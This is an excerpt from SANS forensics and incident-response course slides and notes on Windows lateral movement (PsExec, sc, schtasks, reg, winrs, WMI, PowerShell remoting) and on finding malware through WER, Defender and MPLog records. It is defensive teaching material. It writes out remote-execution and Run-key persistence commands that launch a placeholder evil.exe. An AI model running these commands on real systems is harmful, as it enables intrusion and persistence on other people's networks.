that there is no letter “c” in the destination filename). The creation of the PsExeSvc service creates an easy-tospot service key named SYSTEM\CurrentControlSet\Services\PSEXESVC. This key may or may not still be
present on the system, as it is sometimes deleted after session close. However, deleted registry keys can be
recovered. The Metasploit version of PsExec uses a random service name in exchange for PSEXESVC, making
it easy to identify as evil. PsExec will create a user profile on the destination system by default. This presumes a
profile doesn’t already exist and that the attackers did not include the –e (do not create profile) option. The
creation time of this profile, and its corresponding NTUSER.DAT registry data, can be another indicator of the
time of PsExec activity.
© 2023 SANS Institute

.

121

A final place to discover PsExeSvc activity is via running processes and memory analysis. The named pipes
used to facilitate communication can be identified via process handles. The names of the pipes provide
extremely useful information including the source hostname. As an example:
\\10.10.2.20\pipe\PSEXESVC-<sourcehostname>-<PID>-stdin
\\10.10.2.20\pipe\PSEXESVC-<sourcehostname>-<PID>-stdout
\\10.10.2.20\pipe\PSEXESVC-<sourcehostname>-<PID>-stderr

.

It is important to note that many of the above artifacts presume the default name, PSEXESVC, is in use. Newer
versions of PsExec include the “-r” option, allowing an attacker to change this name to anything they like. When
this option is used, the executable name (and relevant execution artifacts), service name, and named pipes will
all reflect the name provided by the attacker. While this in no way reduces the number of artifacts recorded, it
can help attackers evade specific filters set up to automatically look for the default names.

122

© 2023 SANS Institute

.

Windows Remote Management Tools

Windows includes many tools capable of remote execution
➢ Create and start remote service
sc \\host create servicename binpath= “c:\temp\evil.exe”
sc \\host start servicename

➢ Remotely schedule tasks
at \\host 13:00 “c:\temp\evil.exe”
schtasks /CREATE /TN taskname /TR C:\evil.exe /SC once /RU “SYSTEM” /ST 13:00 /S host /U user

➢ Interact with remote registries
reg add \\host\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Data /t REG_SZ /d “C:\evil.exe”

➢ Execute any remote command
winrs –r:host –u:user command

123

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Numerous Windows commands have remote execution capabilities. Once an attacker collects credentials that
allow remote authentication (Domain Admin being the preferred), a vast number of lateral actions can be taken
throughout the enterprise. These tools are particularly prized by attackers since they facilitate “living off the
land”—a strategy that allows attackers to accomplish their goals with little to no external tools required. This
reduces the attack profile, often making detection more difficult.
Some of the most common remote commands used for lateral movement are presented on this slide.
Create and start a remote service
Services are commonly used to execute binaries remotely and establish persistence if necessary. However, they
do leave excellent artifacts behind for detection. Services are recorded in the registry and include the binary that
was executed. Attackers may delete the service in an effort to clean up, but deleted registry keys can persist. In
addition, there is extensive Windows event logging in the system log for service-related activity.
Example:
sc \\host create servicename binpath= “c:\temp\malware.exe”
sc \\host start servicename
Remotely schedule tasks
Tasks can be scheduled either locally or remotely and can be run as any user (assuming the credentials are
known). Scheduled tasks leave behind “.job” files indicating what was scheduled (and who scheduled it) as well
as decent event log evidence.
at \\host 13:00 “c:\temp\evil.exe”
schtasks /CREATE /TN taskname /TR c:\evil.exe /SC once /RU “SYSTEM” /ST
13:00 /S host /U user

© 2023 SANS Institute

.

123

Interact with remote registries
The registry can be manipulated for all sort of evil and, of course, there is a built-in windows tool to allow it to
be done remotely. The Remote Registry service must be started on the target and prior authentication with the
system must be in place since there is no option in reg.exe to provide credentials (attackers often mount an
admin share to pre-authenticate). Registry key last write times are some of the best detection mechanisms.
“C:\evil.exe”
Execute any remote command
Windows remote shell (winrs) arrived in Win2008 and may be a bit more obscure than WMIC and PowerShell,
but it is still very powerful. If Windows Remote Management service (WinRM) is enabled on a system, it can
run any arbitrary command, with default encrypted traffic. It has similar capabilities to PsExec but can often
pass through host firewalls in situations where PsExec fails (assuming WinRM is enabled in the environment).
In some cases, attackers may turn on the WinRM service to accomplish their objectives. In some enterprises, the
existence of this service being enabled could be a clue to potential nefarious activity. Additionally, winrs will
start the winrshost.exe process on the remote system.
winrs –r:host –u:user command

.

All of these commands can also leave behind process artifacts in memory and application execution artifacts on
disk such as Windows Prefetch. Network forensics can also identify some most of this activity. As an example,
remote scheduled tasks, service creation, and registry changes can be easily analyzed via packet analysis.
WinRM traffic (winrs) is the notable exception—while traffic can be identified, default encryption would likely
defeat detailed analysis.

124

© 2023 SANS Institute

.

Windows Remote Management Tools: Remote Services

Remote Services Source System Artifacts

Remote Services Destination System Artifacts

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics 125 125

Remote services unfortunately leave behind few artifacts on the source system. While sc.exe can be identified
via application execution artifacts, without command line auditing it can be difficult to determine if it was used
on a local service or a destination system.

.

On the destination system, however, we have many artifacts to identify malicious activities. Event logs can be
very helpful, showing both what account was used for authentication, as well as a wealth of knowledge about
the services interacted with. If a new executable or DLL is used to create a new service, creation of those files
and subsequent application execution artifacts can be identified.

© 2023 SANS Institute

.

125

Windows Remote Management Tools: Scheduled Tasks

Scheduled Task Source System Artifacts

Scheduled Task Destination System Artifacts

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

If you are planning an attack and want to be stealthy, you might want to skip using scheduled tasks. Scheduled
task activity leaves an enormous amount of residue on the source and destination systems. Source systems have
the standard application execution and “runas” explicit credential artifacts. However, the destination system
contains a wealth of information defenders are interested in.

.

Like most lateral movement techniques we cover, event logs on the destination system can be incredibly useful
in identifying malicious activity. The authentication events show what user accounts are being abused. The
Security log maintains several event IDs related to the creation, deletion, and enabling of tasks. There is also a
dedicated Task Scheduler log maintaining similar information (this log may need to be enabled on the latest
versions of Windows). In addition to logs, “job” files stored in the Tasks folders are frequently ignored by
attackers and can provide precise details about any malicious tasks. Finally, Windows registry and application
execution artifacts are also generated.

126

© 2023 SANS Institute

.

126

WMI: Source System Artifacts
wmic /node:host /user:user process call create “c:\temp\evil.exe”
Invoke-WmiMethod – Computer host –Class Win32_Process –Name create – Argument “C:\evil.exe”

• One of the most powerful lateral movement options
and one of the most difficult to investigate
• WMI is native to every modern Windows system
*PowerShell will be covered separately

• Source system artifacts are sparse

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

127

.

WMI is a flexible remote (and local) management infrastructure. While PowerShell can leverage and script
WMI commands, WMI can also be used on its own as an attack tool. The use of WMI and PowerShell across
the kill chain is increasing as sophisticated attackers seek to evade security mechanisms and leave smaller
forensic footprints. Sadly, attackers currently have an advantage when using these tools. In most enterprises,
there are few forensic artifacts left behind to show WMI/PowerShell activity. However, there are ways to better
architect a network to detect this activity.
The most common WMI command used for lateral movement is “process call create”. This is an extremely
powerful and popular command, giving adversaries similar capabilities to PsExec, while leaving fewer artifacts
(for example, no service is created with this command). WMI commands are typically not encrypted unless they
happen to be used over the WinRM protocol (e.g., using PowerShell). Thus, network forensics can be useful for
tracking WMI usage.
wmic /node:host /user:user process call create “c:\temp\evil.exe”
Invoke-WmiMethod – Computer host –Class Win32_Process –Name create –
Argument “C:\evil.exe”
Unfortunately, source systems maintain few records of WMI activity. The existence of application execution
artifacts for wmic.exe is a good indication, but command line auditing is necessary to piece together what it was
used for. Luckily, artifacts recorded on destination systems are much more useful.

© 2023 SANS Institute

.

127

WMI: Destination System Artifacts

• WMI activity has long been a blind spot
• wmiprvse.exe is a strong indication
• The new Microsoft-Windows-WMIActivity/Operational log is a game changer
• Look for residue left from WMI event consumers

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

WMI activity has long been a blind spot in the enterprise, and we are lucky that tools and techniques are starting
to change that. On the destination system, event logs will be useful for authentication events, particularly if you
can tie them to a process tracking event or application execution of wmiprvse.exe (the core process used for
remote WMI actions). A new log starting in Win2012R2, Microsoft-Windows-WMIActivity/Operational, provides evidence of remote WMI activity and is one of the few artifacts that can
help identify WMI event consumers (commonly used for malware persistence). This log is one of our best (and
only) information sources for WMI attacks.
The destination file system can help us identify any executables copied to the remote system (especially if
“process call create” was in use). Evidence of the creation of .mof files or the execution of mofcomp.exe can
provide early indications of WMI event consumers, as .mof files are one of the easiest ways to implement them.
Once the activity has been identified, review of the WMI Repository can identify the type of persistence and
what was scheduled to be executed (PowerShell can be helpful for auditing this).
You will notice that compared to other attack vectors, we have far fewer artifacts to rely upon. This is exactly
why some of the most advanced adversaries have started moving toward WMI and PowerShell toolkits.

128

© 2023 SANS Institute

.

128

PowerShell Remoting: Source System Artifacts

• Look for evidence of powershell.exe execution
• PowerShell v5 (Win10+) introduced improved logging

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

129

.

PowerShell is a scripting language that has access to WMI (and much more). PowerShell remoting uses the
WinRM protocol to effortlessly scale tasks. Using PowerShell, running a credential dumper on one system is
nearly as simple as running it remotely on 1,000 systems. To scale effectively, PowerShell remoting must be
enabled, which is increasingly the case as it is used heavily for enterprise administration (Windows server
products starting with Server 2012 have it enabled by default). The most common PowerShell commands for
lateral movement are Invoke-Command and Enter-PSSession. The latter provides an encrypted interactive shell
to the remote system similar to SSH.
Invoke-Command –ComputerName host –ScriptBlock {Start-Process
c:\temp\evil.exe}
Enter-PSSession –ComputerName host –Credential user
Similar to discovering malicious WMI, finding PowerShell usage can be daunting for defenders. On the source
system, look for evidence of powershell.exe usage. Application execution artifacts like Prefetch and ShimCache
can pinpoint its use. Logs are critically important to tracking PowerShell, and with PowerShell version 5
(Win10+), there is finally good logging available. The Microsoft-WindowsPowerShell/Operational log on the source system can identify PowerShell sessions. MicrosoftWindows-WinRM/Operational can identify remote PowerShell activity, including the destination
hostname, IP address, and username. Process tracking and command line auditing are absolutely critical to
piecing together many WMI and PowerShell attacks. Adding this capability is perhaps the most important
detective technique. Luckily, PowerShell version 5 now has a console history log,
ConsoleHost_history.txt, that records the last 4,096 commands typed per user on the source system.
We will cover command line logging in the event log section.
Finally, if you happen to be in an environment where Windows remote management is not used, you are in luck.
In this situation, searching for systems with the Windows Remote Management (WS-Management) service
enabled can help identify where attackers have traveled. The biggest challenge with regard to these tools is most
organizations are extensively using them for administrative purposes. Thus, separating good from bad activity
can be very difficult. That being said, with good logging, evil activity is often easy to spot. As an example,
© 2023 SANS Institute

.

129

.

admins typically do not use “wmic process call create” or encoded PowerShell scripts. Similar to other incident
response techniques, focus first on the anomalies.

130

© 2023 SANS Institute

.

PowerShell Remoting: Destination System Artifacts

• wsmprovhost.exe is good indicator of PS Remoting

• Full script logging is available in PSv5
• Blocklisted cmdlets are logged by default

powershell.exe

wsmprovhost.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

131

.

When investigating a target (destination) system involved in potential PowerShell attacks, look for evidence of
wsmprovhost.exe execution. This process is executed on the receiving end of a PowerShell remoting session and
may be rare in some environments (in others, it may be ubiquitous). In addition, PowerShell may be used to
push and execute arbitrary binaries on the system, so strange file creation and application execution events can
lead to evidence proving PowerShell activity.
By far, the biggest weapon we have to identify PowerShell usage is event logging. PS version 5 improved
logging for both the source and destination systems of PowerShell remoting attacks. Expect to see Type 3
(network) logon events, showing the account authentication necessary to run these tools. PowerShell v5 now
includes detailed script block logging, including logging suspicious activity by default. This means that even in
environments with weak audit policies, there can still be very useful PowerShell logging, often capturing the
entire script contents of what was accomplished via PowerShell (scripts using blocklisted cmdlets are logged by
default). This information is captured in the Microsoft-Windows-PowerShell/Operational log on
the destination system. Process tracking and command line auditing events (not enabled by default) can capture
every PowerShell command executed.
Of all the recent shifts in attacker behavior, the move to PowerShell is perhaps the most frightening. There are
almost no limits to what can be done using it, and most organizations have not devoted the necessary time and
resources toward ensuring they can track anomalous usage. Hopefully, this course will give you ideas you can
bring back to your organization to prepare for this incredibly dangerous and stealthy attack vector.

© 2023 SANS Institute

.

131

Application Deployment Software

Use of legitimate patching tools
• The path of least resistance for
mass pwnage
• Could be used for limited or mass
distribution of tools/malware

• Similar attacks can be performed
via cloud control panels
• Case Study: South Korea Banks

Detection
• Limit and monitor service
accounts used by software
• Strict change control
• Push at similar times to help

identify anomalous deployments

• Create test systems to collect
and monitor package
deployments

• AhnLab patch management software
• Legitimate credentials used to
distribute MBR wiping software
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Once an adversary compromises administrative credentials like domain administrator or service accounts, they
have all of the power and privileges of your legitimate administrators. They essentially become your newest
(unpaid) system administrators. In addition to full control over much of the infrastructure, attackers can also use
available administration tools. We commonly see this with the use of remote administration tools like RDP,
VNC, PowerShell, and PsExec, but tools are only limited by what is available and the attacker’s creativity.
Enterprise patch management is challenging, and most environments have implemented automated patching
utilities to assist. Amidst all of the deployment complexities, securing access to the deployment application itself
is often forgotten, allowing anyone with the proper credentials full access. Once an adversary has access to the
deployment server, it takes only modest skills to successfully create a deployment package and get it installed on
a small or large population of the network.
Use of application deployment software is a not a theoretical means of lateral movement. In 2013, thousands of
South Korean systems in the communication and financial sector were rendered unusable by destructive wiping
software dubbed “DarkSeoul”. In many of the instances, legitimate patch management software from Korean
vendor AhnLab was used. From the AhnLab press release: “Attackers used stolen user IDs and passwords to
launch some of the attacks. The credentials were used to gain access to individual patch management systems
located on the affected networks. Once the attackers had access to the patch management system, they used it to
distribute the malware much like the system distributes new software and software updates. Contrary to early
reports, no security hole in any AhnLab server or product was used by the attackers to deliver the malicious
code”.
A similar type of attack can be conducted through cloud control panels, which can give full control of an entire
cloud infrastructure. Code deployment mechanisms are necessarily part of cloud machine management, and
cloud consoles make lateral movement trivial. Again, this is not a theoretical capability. One of the most
dramatic attacks in recent memory occurred against a company named Code Spaces, which offered source code
repositories and project management. Hackers took control of their Amazon Web Services control panel, giving
complete control over production and backup systems (sadly present in the same cloud). As staff attempted to
regain control, hackers deleted both production and backup servers along with all customer data. Code Spaces
was ultimately forced to cease all operations and shut down.

132

© 2023 SANS Institute

.

132

hi

de

01

.ir

Detection of this lateral movement technique can be accomplished in multiple ways. Accounts and systems used
in the patch deployment process must be limited and heavily monitored. Creation of unique accounts (instead of
just domain admin) can facilitate alerting. Patch management cycles are usually strictly controlled, and by going
further to limit them to specific days and times, out-of-band use of tools can be more readily identified. The
creation and monitoring of test systems to collect and log package deployments can also be effective. Keep in
mind that malicious deployments may not be enterprise-wide, and thus multiple systems may be required to
cover important network segments.

© 2023 SANS Institute

.

133

Vulnerability Exploitation

• Exploits providing shell access or
allow remote code execution
• WebApp and other application vulns
• HAFNIUM Exchange 0-day exploits
• MS17-010 SMB flaw

• Can also include post-exploitation
malware installation

Detection

• Crash detection
• Crash reports
• Event logs

• Process tracking

• Event ID 4688
• Process anomalies
• Code injection

• Remote access tools (RATs)
• Meterpreter / Beacon

• Antivirus/HIPS/Exploit
Guard logging

• Account logon auditing is
ineffective

• Application control logs
• Threat intelligence

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

While less common than most of the other lateral movements techniques we have discussed, employing exploits
to traverse a network is a long-standing attack capability. This threat vector requires a vulnerability that gives
the ability to run commands on a remote system or remotely execute code. Operating system vulnerabilities in
this class are discovered infrequently and are usually classified as some of our most dangerous. The classic
example in Windows is the MS08-067 RPC vulnerability allowing arbitrary code execution on nearly every
version of Windows available at the time. Amazingly, penetration testers (and certainly attackers) still find
vulnerable systems to this day. MS17-010 patched a SMB v1 remote code execution vulnerability that remained
undiscovered in the wild for years. The HAFNIUM adversary group took advantage of multiple flaws in
Exchange allowing installation of webshells and ultimately code execution.[1] While these dramatic “critical”
bugs get the most attention, in reality, web application and other application vulnerabilities are much more likely
to be used to pivot through a network, as seen in the massive Kaseya ransomware attack. Patching third-party
applications is difficult at scale, and there is no shortage of bugs of which to take advantage.
We would also group in this same category remote access tools installed post-exploitation and subsequently
used by attackers for system access. Poison Ivy, PlugX, Gh0stRat, webshells, and the pervasive Metasploit
Meterpreter and Cobalt Strike Beacon are all examples. An important concept here is that employing remote
access tools or exploits usually circumvents the standard authentication processes and is one of the few lateral
movement techniques that leaves little activity in system logs. This is one reason why adversaries might choose
this option over “living off the land” with built-in remote access tools.
Detecting malware-based lateral movement efforts can be difficult. Paying attention to system crashes recorded
in event logs can be effective. Endpoint security software reporting such as antivirus, host intrusion prevention
systems (HIPS), and Exploit Guard or application crash logging from Microsoft are useful. Good threat
intelligence can help teams react to new vulnerabilities in the wild. As an example, shortly after the discovery of
Shellshock, network intrusion detection signatures and log patterns were provided to identify systems that may
have been attacked. Finally, analysis of system memory and running processes can identify compromised
systems. New processes are tracked with Windows event ID 4688, and specialized tools can find code-injected
processes or unusual handles and parent-child relationships like IIS worker processes spawning command shells
(common with some webshells).
[1] HAFNIUM targeting Exchange Servers with 0-day exploits: https://for508.com/jotyh
134

© 2023 SANS Institute

.

134

Lateral Movement Review
Legitimate credentials and Account Creation

Gain
Authority

Remote Desktop Services
Windows Admin Shares
Copy

PsExec

Malware

Windows Remote Management Tools
Execute
Malware/
Commands

PowerShell Remoting/WMIC
Vulnerability Exploitation and Application Deployment Software
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

135

.

This page intentionally left blank.

© 2023 SANS Institute

.

135

Lab 2.3
Tracking Lateral Movement with EvtxECmd
Average Time: 30 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

136

© 2023 SANS Institute

.

136

Intrusion Analysis Agenda

Advanced Evidence of Execution
Event Log Analysis for Responders and Hunters
Lateral Movement Adversary Tactics
Command Line, PowerShell, and WMI Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

137

.

This page intentionally left blank.

© 2023 SANS Institute

.

137

Command Line, PowerShell,
and WMI Log Analysis

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

138

© 2023 SANS Institute

.

138

Evidence of Malware Execution

Scenario
• Identify potential malware and determine whether it was executed.

Relevant Event IDs
•System Event Log
• Review Critical, Warning, and Error events for system and process crashes

• Application Event Log
• Event IDs 1000-1002 – Windows Error Reporting (WER), Application crashes and hangs

Investigative Notes
• Note crashed applications, processes and system reboots
• Review Windows Error Reports (Report.wer) written during times of interest
• Windows Defender and/or Anti-Virus logs should also be reviewed
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

139

.

When attempting to identify malicious software, it is logical to review event logs. However, due to audit policies
(or lack thereof), we may find more information in the System and Application logs than the Security log.
Although it is true that the Security Event log has the capability to record every process executed via Process
Tracking, in practice it is often not enabled because of the large amount of logging that it creates. In many
enterprises, Process Tracking is left disabled on all but the most critical of systems. PowerShell and WMI logs
may not be centralized. Hence, we will sometimes need to lean on the System and Application logs to identify
unusual activity.
Event IDs are well documented and can be very helpful when working within the Security event log. However,
they are unfortunately far less useful when doing many System and Application log reviews. Events IDs for
these logs are poorly documented and a single ID can have myriad different meanings. In light of this, our
recommendation is to look for the most critical events in these logs, namely the Critical, Error and Warning
events. Although there can be a large number of these events present in the log, most are duplicates that get
logged every hour, every boot cycle, etc. Instead, we will look for the outliers, and when tracking malware, we
will especially look for antivirus or security product warnings that might have identified suspicious activity on
the system. We will also look for unexplained reboots or crashed system processes because malware is a dirty
business and crashes occur at least as often as successful compromises. All that being said, there are a few
common System and Application event IDs that malware can trigger. Application event IDs 1000 and 1002
record application errors and hangs, respectively.
Application log event ID 1001 records Windows Error Reporting events and can identify when additional
logging has been accomplished for troubled applications (and malfunctioning malware).
Corresponding event IDs in Windows XP/2003: Same

© 2023 SANS Institute

.

139

Evidence of Malware Execution: Pass-the-Hash Toolkit

Review of AppCrash logs
identifies attempted use of a
credential dumper.
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

This is a great example of finding evidence in logs other than the Security Event log. Although many of our
security-related events are located there, keep in mind that the operating system and applications running on the
system might have security mechanisms in place that only log to the System or Application logs.

.

In this scenario, an attacker executed a tool named lslsass64.exe from the C:\Temp folder. The name alone
would have likely been interesting but paired with a temp folder and an application error, this finding would be
worth investigating. At the same time a Windows Error Reporting event, EID 1001, was logged indicating an
application crash and the possibility of additional documentation in the local WER folder (sadly the WER
reports are not always present by the time a collection is performed). Also note that even administrator accounts
might have difficulties accessing some folders in the C:\ProgramData\Microsoft\Windows\WER folder. The
ideal solution is to use a forensic collection tool that can evade permissions by recovering files from the raw disk
(there are also tools like Invoke-NinjaCopy that can do the same). After finding evidence of an unusual
executable, the next step would be to look at other events, event logs, and data sources that were updated around
the same time. Windows applications and systems crash frequently, and extra context can help you decide if
you want to dig deeper. Putting these logs in context with the many other artifacts represented inf our forensic
timelines later in the course will make this step easy.

140

© 2023 SANS Institute

.

140

.
© 2023 SANS Institute

.

141

Evidence of Malware Execution: WER Report.wer
C:\ProgramData\Microsoft\Windows\WER

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Windows Error Reporting (WER) is an underappreciated and underused artifact having great potential to
identify hard to find malware and activity. Malware simply doesn’t work on every system and attackers have
limited visibility to understand why their favorite tool is not providing results. This often leads to multiple
failures as the tool is executed in different ways and ultimately in the use of multiple different tools on the same
system. If at first you don’t succeed, try, try again. These attempts can leave many artifacts, including error
reporting. WER logs are typically stored as files named Report.wer and can be present in multiple different
“WER” folders across the file system including:
• C:\ProgramData\Microsoft\Windows\WER
• %User Profile%\AppData\Local\Microsoft\Windows\WER (also check Default, Public, and
All Users profiles).
WER reports are written in simple text (additional reporting may be in XML format) and can provide wonderful
indicators of compromise including time of execution, the full path and name of the executable, the SHA1 hash
of crashed application and a list of loaded modules (DLLs) providing insight into malware capabilities or other
malicious “helper” files.[1] Keep an eye out for Report.wer files written during interesting time periods (this
becomes much easier when using forensics timelines as we will cover later in the course). The free triage tool
KAPE includes a target file to automate collection of .wer files when performing triage collections. Like hashes
stored in the Amcache.hve database, there appears to be a file size cutoff for the creation of valid SHA1 hashes
in WER (in fact, information in WER might come directly from the Amcache). This should not affect most
executables, but with a recent trend towards malware specifically designed to be extra large to evade security
scanning, it is worth keeping in mind.
In the example on this slide, submitting the SHA1 hash to VirusTotal allowed us to identify the suspicious
lslsass64.exe as part of the Pass the Hash Toolkit (interestingly, only 6 of 69 security vendors identified
this sample helping to explain why Windows Defender missed flagging).
[1] Using WER Files to Hunt Evil: https://for508.com/ch5wl

142

© 2023 SANS Institute

.

142

Microsoft Defender Logs (1)

Scenario
• Quickly identify any threats identified from the Defender anti- malware engine
• Technologies like AMSI also greatly increase detection of malicious scripts

Relevant Event IDs
• 1116 | 1117: Malware Detected | Malware Action Taken
• 1118 | 1119: Malware Action Failed | Malware Action Critical Failure

Investigative Notes
• Microsoft-Windows Defender%4Operationa l.evtx
• Microsoft Defender also stores relevant information in other locations:
• Microsoft Protection Log files (MPLog-*) can provide extra insight into detections
• DetectionHistory stores information reported to users and actions taken
• C:\ProgramData\Microsoft\Windows Defender\Quarantine
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

143

While anti-virus is regularly criticized for missing “advanced threats”, it is still a foundational piece of the
security stack. Even the most advanced attacks and toolsets contain components on which anti-virus regularly
alerts. It doesn’t have to be the perfect solution to be useful. Commonplace anti-virus alerts regularly turn into
the initial spark of a full-blown incident response. In short, review those logs!

.

Microsoft Defender has progressed from a home-use product to a top-tier enterprise anti-malware solution.
Adoption accelerated coinciding with the release of Windows 10 and due to its integration with other Microsoft
endpoint security solutions. Even if it is not the primary security solution on the system, it is often run in passive
mode providing similar threat logging capabilities. Microsoft-Windows-Windows
Defender%4Operational.evtx is the primary log for Microsoft Defender alerts. It has excellent
longevity, often providing six months or more of activity in the host-based log (the centralized Microsoft
Defender for Endpoint management portal maintains data for 180 days). It is a simple log with four primary
event identifiers commonly used for threat hunting. Event IDs 1116-1119 capture malware detection events,
actions taken on those events, and any failures while taking actions.[1]
When analyzing a system running Microsoft Defender, it is helpful to know there are also secondary
information sources. MPLog files can provide added context into identified threats, including file hashes,
process information, and files and folder interactions. We will cover them in more depth shortly. Logs stored in
the C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\
DetectionHistory folder track information provided to the end user on identified threats. While
somewhat redundant with the primary event log, it can fill in gaps if data is missing in the log, add additional
metadata like file hashes, and help identify what was reported to the user and the actions chosen by the user
(quarantine, remove, allow, etc.). Jordan Klepser wrote a simple open-source parser to take advantage of this
data source. [2]
Finally, do not forget about the quarantine! While everything discussed so far is metadata about an identified
threat, the quarantine folder might still have the actual files related to that threat! Every vendor obfuscates their
quarantine differently, usually requiring a tool to extract the original file contents. Later in the course we will
cover a tool named maldump which can be used to extract the time of quarantine, the full file path, and original

© 2023 SANS Institute

.

143

file from the Microsoft Defender quarantine folder[3] : C:\ProgramData\Microsoft\Windows
Defender\Quarantine
If you are working in a Microsoft Defender protected network, make sure your collection tools are capturing the
data necessary to take full advantage of the event log, MPLog, DetectionHistory, and Quarantine!

.

[1] Microsoft Defender Antivirus event IDs and error codes: https://for508.com/4rdza
[2] Uncovering Windows Defender Real-time Protection History with DHParser: https://for508.com/madpc
[3] GitHub - maldump: https://for508.com/l4fa0

144

© 2023 SANS Institute

.

Microsoft Defender Logs (2)
Malicious Software Detected
• HackTool:Win64/Mimikatz
• EID 1116: Detection
• EID 1117: Action Taken
File Metadata
• C:\Temp\mz.exe
• Process ID: 24268
• Process Start: 2023­07­20
22:02:32 UTC
• User: Local Service
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

145

.

The Microsoft-Windows-Windows Defender%4Operational.evtx log is straightforward to
analyze. Consider filtering for Event IDs related to identified threats (EIDs 1116-1119) and sift through the
results looking for indicators of compromise. While anti-malware solutions often block identified threats, keep
in mind that in persistent attacks, a captured payload is not the end of the story. The time periods of activity of
any reported threats can be invaluable to match against other forensic artifacts to better understand what
happened on the system and if any other parts of the attack were successful.
In the example on this slide, we see multiple EID 1116 and 1117 events, all for the same threat. A file named
C:\Temp\mz.exe executed and was ultimately quarantined by the system. There can be a lot of information to
unpack in these events. The threat name can (sometimes) give context. In this case, it identified signatures
related to the credential dumping tool Mimikatz. That gives us a head start when deciding what to do with this
data. The malware was running under the context of a built-in account, Local Service, but it is also common to
see activity related directly to user accounts. The process identifier could be helpful if we had a memory image
to analyze, and the process start value can identify how long the malware was running before detection. The
timestamp for the embedded ProcessStart value is quite strange: you need to convert it to hex and then parse it
as a Windows 64-bit timestamp (Big Endian). In this example, it looks like the malware was running for just
under a minute before detection. Hopefully, time was too short for the attackers to accomplish their mission!

© 2023 SANS Institute

.

145

Microsoft Protection Log (MPLog)
C:\ProgramData\Microsoft\Windows Defender\Support\
MPLog-YYYYMMDD-HHMMSS

• The MPLog provides additional context to Defender alerts
• Processes executed (including full path and Process ID)
• Potential Code Injection
• Files and folders related to executables
• SHA1 file hashes
• Original filename metadata from PE header
• Keywords: IOCs (file / folder names), SHA1, detection,
tainted, SDN Query
2023­07­20T22:03:00.058Z SDN:Issuing SDN query for \Device\HarddiskVolume3\Temp\mz.exe
(\Device\HarddiskVolume3\Temp\mz.exe) (sha1=e3b6ea8c46fa831cec6f235a5cf48b38a4ae8d69,
sha2=61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Microsoft Defender MPLog files contain detailed information about the activities and events related to the
scanning and protection processes performed by Microsoft Defender. MPLog files are primarily used for
diagnostic and troubleshooting purposes, but they can also provide valuable insights into system activity. They
are in text form and can be opened and viewed using a text editor. A system can have multiple MPLogs, named
according to their creation date and time (UTC). It is rare to see data going back much more than a month in
these logs. Think of these logs as a means to augment information identified within the Microsoft Defender
event log. They can (sometimes) provide additional context around events, but some of the information is more
incidental than planned. As an example, MPLogs do not record every file interacted with by a process, but they
do sometimes record the full path of a related file which took the longest time to scan. SHA1 hashes are written
to the log for some threats, but not all, and sometimes for executables not flagged in the event log. “Original
filename” information is regularly recorded for executables and DLLs by mapping their portable executable
(PE) header metadata to their actual file name. This can be invaluable when attackers rename files without
updating their header, often providing the original name of the tool (e.g., PsExec instead of 1.exe). Code
injection is a very common attack method in modern malware, and MPLogs attempt to track potential injection
activity. These alerts can be identified by searching for “tainted” but are only one data point and are regularly
logged for legitimate files. Finally, you will find running process lists captured by Defender and written into this
log. This is one of the only places where this information is written into a file, so if you are interested in auditing
running processes during a specific time, the MPLog is the place to find them.
Unlike event logs, MPLogs were not designed for everyday review. The amount of data can be overwhelming,
and they are best used as a supplement to what is found in the event logs, or when looking for something very
specific such as file, folder name, or hashes (indicators of compromise). Other useful search keywords include,
“detection”, “tainted”, and “SDN Query.” The latter is demonstrated on this slide with an entry corresponding to
the previously discovered malware in the Defender event log (mz.exe). Notice the MPLog provides the SHA1
(and SHA2) hash for the executable. James Lovato provides an excellent overview of this log and specific
events recorded in a CrowdStrike blog post.[1] More research is still needed into this log, but it clearly has the
potential to be an excellent information source during intrusion investigations.
[1] How to Use MPLogs for Forensic Investigations: https://for508.com/95wpv

146

© 2023 SANS Institute

.

146

Process Tracking and Capturing Command Lines

Scenario
• Identify potential malware execution and record full command line used to launch a
process (including cmd.exe and powershell.exe)

Relevant Event IDs
•4688 (Security Log): New process created (includes executable path )
• 4689 (Security Log): Process exit

Investigative Notes
• Currently available in Windows 7+
• Records account used, process info, and full command line
• Command line capture requires Process Tracking to be enabled (not on by default)
• Logon ID value can be used to link processes to a user session
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

147

If they are enabled, event ID 4688 Process Tracking events can be an extremely powerful information source.
They show full path, execution time, account information (including session via Logon ID), and can now
capture the full command line. If enabled, EID 4689 events show corresponding process termination.

.

Tracking command line interface (CLI) usage has always been a particularly bad blind spot for forensic
analysts. As PowerShell and WMI attacks become ubiquitous in the enterprise auditing CLI is becoming a
necessity. The command line menace has not been lost on Microsoft. With the release of Server 2012R2,
Microsoft released a new group policy setting to enable recording of full command lines in process reporting.[1]
The response was overwhelming enough that Microsoft later backported the feature to Windows 7 and above
operating systems.[2] To enable, use Group Policy Management to edit the policy and browse to Computer
Configuration > Policies > Administrative Templates > System> Audit Process Creation.
Although this is a step in the right direction, not enough organizations are taking advantage of it. The biggest
hurdle is command line auditing necessarily requires successful process creation auditing to be enabled.
Historically, process tracking audits have been disabled in most environments due to the sheer number of events,
